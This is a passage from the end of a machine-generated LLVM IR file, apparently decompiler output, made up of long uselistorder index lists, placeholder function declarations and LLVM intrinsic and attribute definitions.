899, 900, 901, 902, 903, 715, 904, 905, 906, 907, 787, 786, 403, 789, 790, 788, 401, 402, 791, 792, 527, 793, 795, 796, 716, 797, 798, 799, 717, 800, 801, 61, 62, 120, 802, 803, 804, 105, 106, 805, 806, 807, 228, 808, 809, 810, 811, 812, 528, 813, 814, 815, 816, 817, 818, 168, 821, 718, 822, 823, 63, 64, 122, 824, 825, 826, 719, 827, 828, 829, 830, 720, 831, 832, 65, 66, 121, 833, 834, 835, 836, 837, 229, 231, 819, 230, 820, 232, 838, 169, 908, 913, 914, 909, 910, 911, 916, 917, 918, 233, 919, 920, 921, 922, 923, 912, 915, 924, 170, 929, 930, 931, 529, 1056, 530, 932, 1486, 1487, 1488, 234, 1489, 1382, 1381, 1325, 1298, 1227, 934, 933, 935, 1057, 1058, 1059, 1612, 1613, 1614, 1615, 235, 1616, 1617, 1618, 1326, 1327, 428, 429, 531, 1623, 724, 1624, 532, 1625, 1626, 533, 1627, 1628, 722, 236, 405, 1629, 723, 1630, 534, 107, 1631, 1632, 535, 1647, 1648, 1651, 721, 404, 1652, 467, 172, 171, 1649, 1650, 1619, 1620, 725, 237, 388, 774, 13, 14, 1643, 1100, 953, 1642, 1276, 1383, 143, 239, 1384, 726, 238, 1385, 1386, 1633, 1634, 1635, 1636, 536, 1637, 173, 1030, 1031, 67, 68, 123, 1387, 1388, 112, 407, 1392, 1389, 1390, 727, 1391, 1393, 728, 1394, 1395, 1396, 1397, 69, 70, 124, 1398, 240, 1399, 1400, 1401, 1403, 1402, 406, 775, 777, 776, 241, 778, 779, 780, 537, 781, 174, 1621, 1622, 1032, 1033, 1034, 1035, 1036, 1037, 243, 175, 1038, 1039, 1040, 144, 242, 1041, 176, 539, 540, 1638, 538, 177, 178, 1333, 1334, 1335, 1336, 1337, 244, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 245, 1328, 541, 1329, 1330, 542, 1331, 1332, 179, 729, 246, 247, 1299, 543, 248, 1300, 1301, 1302, 1303, 1304, 255, 249, 251, 254, 252, 250, 258, 257, 256, 253, 1345, 1346, 1370, 1371, 180, 1347, 1348, 262, 260, 261, 1349, 1350, 268, 267, 193, 259, 1351, 1352, 1353, 1354, 1355, 1356, 435, 434, 468, 544, 1357, 1358, 1359, 108, 1360, 264, 263, 265, 266, 192, 1361, 1362, 408, 1363, 1364, 151, 1365, 1366, 1367, 1368, 1369, 15, 16, 954, 955, 109, 17, 469, 545, 1277, 1278, 1280, 1279, 1252, 1251, 1229, 1228, 957, 956, 1042, 958, 959, 1254, 1253, 1255, 961, 960, 1322, 1653, 1654, 125, 181, 1060, 1061, 1062, 269, 936, 937, 270, 1063, 1068, 1069, 1070, 1071, 271, 1064, 272, 1065, 1066, 1072, 1043, 546, 1230, 1639, 1640, 1641, 962, 964, 963, 1073, 965, 1404, 966, 967, 968, 1644, 1645, 1646, 1067, 18, 1490, 1491, 1492, 149, 1493, 1494, 1495, 1496, 1497, 273, 1498, 730, 733, 731, 732, 1499, 734, 194, 274, 1074, 1075, 145, 422, 1076, 1077, 735, 19, 409, 275, 276, 277, 71, 278, 547, 969, 1078, 1079, 1080, 1307, 1306, 1308, 1309, 1310, 1311, 47, 279, 1312, 1313, 1314, 280, 134, 135, 502, 503, 938, 282, 281, 283, 1081, 284, 1082, 1083, 285, 1372, 1373, 548, 286, 1084, 287, 288, 1131, 289, 1101, 976, 970, 292, 971, 549, 972, 550, 766, 754, 755, 740, 756, 741, 757, 758, 742, 759, 743, 760, 744, 761, 745, 762, 763, 136, 72, 391, 392, 764, 746, 765, 767, 768, 769, 770, 771, 290, 291, 772, 773, 973, 736, 974, 551, 975, 411, 410, 977, 978, 979, 980, 294, 293, 981, 982, 983, 747, 389, 984, 126, 127, 390, 985, 128, 129, 552, 987, 988, 737, 989, 990, 991, 992, 993, 553, 994, 995, 423, 424, 195, 739, 996, 997, 998, 999, 1000, 1001, 738, 1002, 1003, 554, 1004, 555, 1005, 1008, 1009, 1010, 295, 1006, 296, 1007, 297, 986, 939, 940, 941, 138, 73, 942, 137, 74, 943, 944, 556, 945, 557, 946, 558, 947, 948, 950, 298, 299, 949, 425, 75, 130, 436, 951, 300, 20, 952, 1102, 1103, 1011, 559, 1012, 1014, 301, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 303, 302, 1022, 560, 1023, 561, 1024, 562, 1013, 1025, 437, 1028, 563, 1029, 782, 564, 1026, 1027, 565, 308, 307, 748, 182, 310, 309, 749, 183, 312, 311, 750, 184, 314, 313, 751, 185, 316, 315, 752, 186, 753, 306, 305, 304, 413, 426, 414, 415, 416, 417, 566, 1044, 317, 318, 1052, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 412, 1053, 1054, 76, 1055, 319, 567, 146, 1085, 1086, 1087, 1088, 420, 1089, 1090, 1091, 419, 1092, 1093, 1094, 1095, 320, 1096, 1098, 1097, 187, 188, 321, 418, 323, 322, 1099, 324, 325, 110, 326, 329, 1104, 1105, 1106, 1107, 328, 327, 330, 1108, 1109, 77, 78, 196, 150, 331, 111, 569, 1110, 1111, 1112, 1113, 1114, 332, 1115, 1116, 472, 1117, 1118, 1119, 1120, 336, 333, 334, 335, 1121, 1122, 1123, 1124, 570, 1125, 1126, 471, 1127, 568, 1128, 470, 1129, 571, 1130, 338, 1132, 1133, 1134, 1135, 337, 339, 1136, 1137, 79, 80, 139, 1138, 340, 1139, 1140, 475, 1141, 473, 1142, 474, 1143, 344, 1145, 1146, 1147, 1148, 343, 342, 345, 1149, 1150, 81, 82, 1144, 341, 1151, 1152, 346, 1153, 1154, 478, 1155, 477, 1156, 476, 1157, 572, 1158, 574, 140, 83, 1159, 189, 479, 575, 1160, 1161, 347, 348, 1162, 573, 1163, 351, 1164, 1165, 1166, 1167, 350, 349, 352, 1168, 1169, 84, 85, 190, 1170, 1171, 21, 22, 23, 24, 1172, 1173, 353, 481, 1174, 576, 1175, 577, 1176, 578, 1177, 579, 1178, 580, 1179, 581, 1180, 480, 1181, 357, 1183, 1184, 1185, 1186, 355, 354, 358, 1187, 1188, 86, 87, 1182, 356, 1190, 1189, 25, 26, 27, 28, 1191, 359, 1192, 1193, 483, 1194, 582, 1195, 583, 1196, 584, 1197, 585, 1198, 586, 1199, 587, 1200, 482, 1201, 588, 1202, 363, 1204, 1205, 1206, 1207, 361, 360, 364, 1208, 1209, 88, 89, 1203, 362, 1210, 90, 589, 1211, 1213, 1214, 1215, 1216, 590, 1217, 29, 30, 31, 32, 33, 1212, 365, 1218, 1219, 489, 1220, 488, 1221, 487, 1222, 486, 1223, 484, 1224, 485, 1225, 591, 1226, 369, 1232, 1233, 1234, 1235, 367, 366, 370, 1236, 1237, 91, 92, 1231, 368, 1238, 93, 592, 1239, 1241, 1242, 1243, 1244, 593, 1245, 34, 35, 36, 37, 38, 1240, 371, 1246, 1247, 491, 1248, 490, 1249, 594, 1250, 596, 141, 94, 1256, 191, 492, 597, 598, 1257, 1258, 372, 373, 1259, 595, 1262, 1263, 1264, 375, 376, 1265, 1266, 95, 1260, 1261, 374, 1268, 1267, 1269, 377, 1270, 1271, 495, 1272, 494, 1273, 493, 1274, 599, 1275, 1282, 1283, 1284, 379, 380, 381, 1286, 1287, 96, 1285, 1281, 378, 1289, 1290, 1288, 1291, 382, 1292, 1293, 498, 1294, 497, 1295, 496, 1296, 600, 1297, 438, 1305, 1315, 383, 1316, 1323, 384, 1324, 1374, 152, 1375, 1376, 439, 601, 421, 1377, 1378, 48, 427, 1379, 1380, 602, 1405, 385, 1406, 499, 783, 500, 501, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669 }
  uselistorder i32* @r4, { 88, 856, 857, 858, 859, 860, 878, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 10, 875, 876, 877, 879, 880, 881, 882, 883, 884, 885, 886, 95, 96, 97, 98, 141, 11, 142, 143, 144, 12, 145, 146, 147, 148, 149, 150, 151, 0, 13, 152, 153, 154, 155, 156, 157, 158, 159, 218, 219, 887, 89, 90, 91, 889, 890, 891, 5, 894, 61, 888, 775, 776, 99, 100, 101, 102, 103, 104, 105, 106, 107, 895, 896, 160, 161, 14, 4, 162, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 15, 163, 164, 165, 166, 167, 168, 169, 170, 189, 16, 190, 191, 171, 172, 174, 17, 175, 178, 18, 179, 180, 19, 181, 182, 20, 183, 184, 21, 185, 186, 22, 187, 58, 188, 173, 192, 23, 193, 194, 195, 196, 197, 198, 199, 176, 177, 92, 93, 94, 108, 109, 110, 111, 24, 112, 25, 26, 113, 114, 115, 116, 117, 118, 119, 124, 125, 27, 126, 127, 28, 128, 129, 29, 130, 131, 30, 132, 133, 31, 134, 135, 32, 136, 137, 120, 121, 122, 123, 138, 139, 140, 200, 201, 202, 33, 203, 204, 205, 34, 206, 207, 208, 209, 210, 211, 56, 212, 213, 214, 215, 216, 217, 220, 221, 222, 223, 380, 224, 892, 893, 838, 839, 840, 841, 842, 843, 739, 740, 381, 382, 913, 914, 915, 780, 781, 60, 918, 57, 919, 920, 921, 937, 939, 940, 941, 938, 922, 927, 935, 936, 916, 928, 929, 930, 931, 62, 844, 845, 6, 35, 846, 36, 847, 848, 849, 923, 924, 850, 79, 80, 81, 82, 83, 84, 917, 925, 926, 225, 226, 227, 228, 782, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 37, 798, 799, 800, 801, 783, 784, 785, 741, 742, 743, 744, 745, 746, 747, 748, 749, 38, 750, 751, 752, 753, 754, 755, 756, 757, 758, 802, 824, 825, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 59, 816, 817, 1, 818, 819, 820, 821, 822, 823, 248, 249, 250, 707, 708, 709, 710, 711, 714, 715, 716, 63, 712, 713, 663, 664, 665, 666, 667, 668, 669, 614, 615, 616, 619, 620, 621, 617, 618, 251, 252, 253, 254, 255, 256, 257, 64, 258, 259, 670, 671, 672, 673, 674, 675, 676, 260, 261, 262, 263, 264, 265, 65, 383, 384, 385, 386, 387, 388, 389, 229, 230, 231, 390, 391, 392, 393, 9, 394, 395, 396, 397, 398, 399, 400, 266, 267, 268, 271, 272, 273, 269, 270, 274, 275, 276, 277, 278, 279, 932, 933, 934, 280, 281, 282, 401, 402, 403, 404, 405, 283, 284, 285, 286, 287, 288, 289, 290, 464, 465, 423, 424, 77, 78, 291, 292, 293, 294, 68, 69, 66, 67, 70, 71, 72, 73, 74, 75, 76, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 313, 314, 315, 316, 323, 324, 325, 326, 327, 7, 317, 318, 319, 320, 321, 322, 309, 310, 311, 312, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 717, 718, 425, 426, 427, 428, 429, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 347, 348, 349, 350, 351, 352, 85, 86, 341, 342, 343, 344, 345, 346, 353, 39, 40, 41, 42, 43, 44, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 406, 407, 8, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 45, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 2, 503, 504, 505, 506, 507, 508, 509, 510, 46, 511, 47, 512, 48, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 49, 537, 50, 538, 51, 539, 52, 540, 541, 542, 543, 53, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 54, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 55, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 677, 678, 679, 3, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 777, 778, 779, 826, 827, 830, 828, 829, 831, 832, 833, 834, 835, 836, 837, 851, 852, 853, 854, 87, 855 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
